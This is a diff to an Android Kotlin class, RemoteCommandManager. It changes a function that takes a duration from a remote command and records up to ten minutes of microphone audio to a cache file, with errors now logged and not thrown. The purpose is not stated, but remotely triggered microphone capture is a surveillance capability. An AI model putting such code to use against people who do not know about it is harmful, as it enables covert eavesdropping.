@@ -741,15 +741,16 @@ class RemoteCommandManager(private val context: Context) {
         if (trimmed.startsWith("{")) {
             try {
                 val json = JSONObject(trimmed)
-                val d = when {
-                    json.has("duration") -> json.optLong("duration")
-                    json.has("seconds") -> json.optLong("seconds")
-                    json.has("durationSeconds") -> json.optLong("durationSeconds")
-                    json.has("sec") -> json.optLong("sec")
-                    json.has("length") -> json.optLong("length")
-                    else -> 10L
+                val keys = listOf("durationSec", "duration_sec", "duration", "seconds", "durationSeconds", "sec", "length", "time")
+                for (key in keys) {
+                    if (json.has(key)) {
+                        val d = json.optLong(key, 0L)
+                        if (d > 0) {
+                            durationSec = d
+                            break
+                        }
+                    }
                 }
-                if (d > 0) durationSec = d
             } catch (_: Exception) {}
         } else if (trimmed.contains("=")) {
             val valPart = trimmed.substringAfter("=").trim().filter { it.isDigit() }
@@ -764,6 +765,7 @@ class RemoteCommandManager(private val context: Context) {
         val finalDuration = durationSec.coerceIn(1L, 600L)
 
         val outFile = File(context.cacheDir, "remote_audio_${System.currentTimeMillis()}.m4a")
+        if (outFile.exists()) outFile.delete()
 
         val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
             MediaRecorder(context)
@@ -773,7 +775,6 @@ class RemoteCommandManager(private val context: Context) {
         }
 
         var isRecordingStarted = false
-        var recordError: Exception? = null
 
         try {
             recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
@@ -781,7 +782,6 @@ class RemoteCommandManager(private val context: Context) {
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
             recorder.setAudioEncodingBitRate(64000)
             recorder.setAudioSamplingRate(22050)
-            recorder.setMaxDuration(finalDuration.toInt() * 1000)
             recorder.setOutputFile(outFile.absolutePath)
 
             recorder.prepare()
@@ -791,26 +791,21 @@ class RemoteCommandManager(private val context: Context) {
             // Wait for specified duration
             delay(finalDuration * 1000L)
         } catch (e: Exception) {
-            recordError = e
+            Log.e("RemoteCommandManager", "MediaRecorder recording error: ${e.message}")
         } finally {
             if (isRecordingStarted) {
                 try {
                     recorder.stop()
-                } catch (e: Exception) {
-                    Log.e("RemoteCommandManager", "MediaRecorder stop exception: ${e.message}")
+                } catch (t: Throwable) {
+                    Log.e("RemoteCommandManager", "MediaRecorder stop safely caught: ${t.message}")
                 }
             }
             try {
                 recorder.reset()
-            } catch (_: Exception) {}
+            } catch (t: Throwable) {}
             try {
                 recorder.release()
-            } catch (_: Exception) {}
-        }
-
-        if (recordError != null && (!outFile.exists() || outFile.length() == 0L)) {
-            try { if (outFile.exists()) outFile.delete() } catch (_: Exception) {}
-            throw recordError!!
+            } catch (t: Throwable) {}
         }
 
         if (outFile.exists() && outFile.length() > 0) {
